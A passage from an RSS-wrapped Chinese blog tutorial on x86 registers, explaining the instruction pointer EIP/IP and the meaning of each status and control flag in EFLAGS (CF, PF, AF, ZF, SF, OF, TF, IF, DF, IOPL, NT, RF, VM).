&lt;h1 id=&#34;5、指令指针寄存器&#34;&gt;&lt;a href=&#34;#5、指令指针寄存器&#34; class=&#34;headerlink&#34; title=&#34;5、指令指针寄存器&#34;&gt;&lt;/a&gt;5、指令指针寄存器&lt;/h1&gt;&lt;p&gt;32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。 &lt;/p&gt;
&lt;p&gt;指令指针EIP、IP(Instruction Pointer)是存放下次将要执行的指令在代码段的偏移量。 &lt;/p&gt;
&lt;p&gt;在具有预取指令功能的系统中，下次要执行的指令通常已被预取到指令队列中，除非发生转移情况。 &lt;/p&gt;
&lt;p&gt;所以，在理解它们的功能时，不考虑存在指令队列的情况。 &lt;/p&gt;
&lt;h1 id=&#34;6、标志寄存器&#34;&gt;&lt;a href=&#34;#6、标志寄存器&#34; class=&#34;headerlink&#34; title=&#34;6、标志寄存器&#34;&gt;&lt;/a&gt;6、标志寄存器&lt;/h1&gt;&lt;h2 id=&#34;一、运算结果标志位&#34;&gt;&lt;a href=&#34;#一、运算结果标志位&#34; class=&#34;headerlink&#34; title=&#34;一、运算结果标志位&#34;&gt;&lt;/a&gt;一、运算结果标志位&lt;/h2&gt;&lt;h3 id=&#34;1、进位标志CF-Carry-Flag&#34;&gt;&lt;a href=&#34;#1、进位标志CF-Carry-Flag&#34; class=&#34;headerlink&#34; title=&#34;1、进位标志CF(Carry Flag)&#34;&gt;&lt;/a&gt;1、进位标志CF(Carry Flag)&lt;/h3&gt;&lt;p&gt;进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 &lt;/p&gt;
&lt;p&gt;使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。 &lt;/p&gt;
&lt;h3 id=&#34;2、奇偶标志PF-Parity-Flag&#34;&gt;&lt;a href=&#34;#2、奇偶标志PF-Parity-Flag&#34; class=&#34;headerlink&#34; title=&#34;2、奇偶标志PF(Parity Flag)&#34;&gt;&lt;/a&gt;2、奇偶标志PF(Parity Flag)&lt;/h3&gt;&lt;p&gt;奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。 &lt;/p&gt;
&lt;p&gt;利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。 &lt;/p&gt;
&lt;h3 id=&#34;3、辅助进位标志AF-Auxiliary-Carry-Flag&#34;&gt;&lt;a href=&#34;#3、辅助进位标志AF-Auxiliary-Carry-Flag&#34; class=&#34;headerlink&#34; title=&#34;3、辅助进位标志AF(Auxiliary Carry Flag)&#34;&gt;&lt;/a&gt;3、辅助进位标志AF(Auxiliary Carry Flag)&lt;/h3&gt;&lt;p&gt;在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0： &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在字操作时，发生低字节向高字节进位或借位时； &lt;/li&gt;
&lt;li&gt;在字节操作时，发生低4位向高4位进位或借位时。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。 &lt;/p&gt;
&lt;h3 id=&#34;4、零标志ZF-Zero-Flag&#34;&gt;&lt;a href=&#34;#4、零标志ZF-Zero-Flag&#34; class=&#34;headerlink&#34; title=&#34;4、零标志ZF(Zero Flag)&#34;&gt;&lt;/a&gt;4、零标志ZF(Zero Flag)&lt;/h3&gt;&lt;p&gt;零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。 &lt;/p&gt;
&lt;h3 id=&#34;5、符号标志SF-Sign-Flag&#34;&gt;&lt;a href=&#34;#5、符号标志SF-Sign-Flag&#34; class=&#34;headerlink&#34; title=&#34;5、符号标志SF(Sign Flag)&#34;&gt;&lt;/a&gt;5、符号标志SF(Sign Flag)&lt;/h3&gt;&lt;p&gt;符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。 &lt;/p&gt;
&lt;h3 id=&#34;6、溢出标志OF-Overflow-Flag&#34;&gt;&lt;a href=&#34;#6、溢出标志OF-Overflow-Flag&#34; class=&#34;headerlink&#34; title=&#34;6、溢出标志OF(Overflow Flag)&#34;&gt;&lt;/a&gt;6、溢出标志OF(Overflow Flag)&lt;/h3&gt;&lt;p&gt;溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 “&lt;/p&gt;
&lt;p&gt;溢出”和“进位”是两个不同含义的概念，不要混淆。&lt;/p&gt;
&lt;h2 id=&#34;二、状态控制标志位&#34;&gt;&lt;a href=&#34;#二、状态控制标志位&#34; class=&#34;headerlink&#34; title=&#34;二、状态控制标志位&#34;&gt;&lt;/a&gt;二、状态控制标志位&lt;/h2&gt;&lt;p&gt;状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。 &lt;/p&gt;
&lt;h2 id=&#34;1、追踪标志TF-Trap-Flag&#34;&gt;&lt;a href=&#34;#1、追踪标志TF-Trap-Flag&#34; class=&#34;headerlink&#34; title=&#34;1、追踪标志TF(Trap Flag)&#34;&gt;&lt;/a&gt;1、追踪标志TF(Trap Flag)&lt;/h2&gt;&lt;p&gt;当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。 指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。 &lt;/p&gt;
&lt;h3 id=&#34;2、中断允许标志IF-Interrupt-enable-Flag&#34;&gt;&lt;a href=&#34;#2、中断允许标志IF-Interrupt-enable-Flag&#34; class=&#34;headerlink&#34; title=&#34;2、中断允许标志IF(Interrupt-enable Flag)&#34;&gt;&lt;/a&gt;2、中断允许标志IF(Interrupt-enable Flag)&lt;/h3&gt;&lt;p&gt;中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。 但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。 具体规定如下： &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求； &lt;/li&gt;
&lt;li&gt;当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。 CPU的指令系统中也有专门的指令来改变标志位IF的值。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;3、方向标志DF-Direction-Flag&#34;&gt;&lt;a href=&#34;#3、方向标志DF-Direction-Flag&#34; class=&#34;headerlink&#34; title=&#34;3、方向标志DF(Direction Flag)&#34;&gt;&lt;/a&gt;3、方向标志DF(Direction Flag)&lt;/h3&gt;&lt;p&gt;方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。 在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。 &lt;/p&gt;
&lt;h2 id=&#34;三、32位标志寄存器增加的标志位&#34;&gt;&lt;a href=&#34;#三、32位标志寄存器增加的标志位&#34; class=&#34;headerlink&#34; title=&#34;三、32位标志寄存器增加的标志位&#34;&gt;&lt;/a&gt;三、32位标志寄存器增加的标志位&lt;/h2&gt;&lt;h3 id=&#34;1、I-O特权标志IOPL-I-O-Privilege-Level&#34;&gt;&lt;a href=&#34;#1、I-O特权标志IOPL-I-O-Privilege-Level&#34; class=&#34;headerlink&#34; title=&#34;1、I/O特权标志IOPL(I/O Privilege Level)&#34;&gt;&lt;/a&gt;1、I/O特权标志IOPL(I/O Privilege Level)&lt;/h3&gt;&lt;p&gt;I/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。 如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常。 &lt;/p&gt;
&lt;h3 id=&#34;2、嵌套任务标志NT-Nested-Task&#34;&gt;&lt;a href=&#34;#2、嵌套任务标志NT-Nested-Task&#34; class=&#34;headerlink&#34; title=&#34;2、嵌套任务标志NT(Nested Task)&#34;&gt;&lt;/a&gt;2、嵌套任务标志NT(Nested Task)&lt;/h3&gt;&lt;p&gt;嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下： &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作； &lt;/li&gt;
&lt;li&gt;当NT=1，通过任务转换实现中断返回。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;3、重启动标志RF-Restart-Flag&#34;&gt;&lt;a href=&#34;#3、重启动标志RF-Restart-Flag&#34; class=&#34;headerlink&#34; title=&#34;3、重启动标志RF(Restart Flag)&#34;&gt;&lt;/a&gt;3、重启动标志RF(Restart Flag)&lt;/h3&gt;&lt;p&gt;重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。 在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。 &lt;/p&gt;
&lt;h3 id=&#34;4、虚拟8086方式标志VM-Virtual-8086-Mode&#34;&gt;&lt;a href=&#34;#4、虚拟8086方式标志VM-Virtual-8086-Mode&#34; class=&#34;headerlink&#34; title=&#34;4、虚拟8086方式标志VM(Virtual 8086 Mode)&#34;&gt;&lt;/a&gt;4、虚拟8086方式标志VM(Virtual 8086 Mode)&lt;/h3&gt;&lt;p&gt;如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态。 &lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
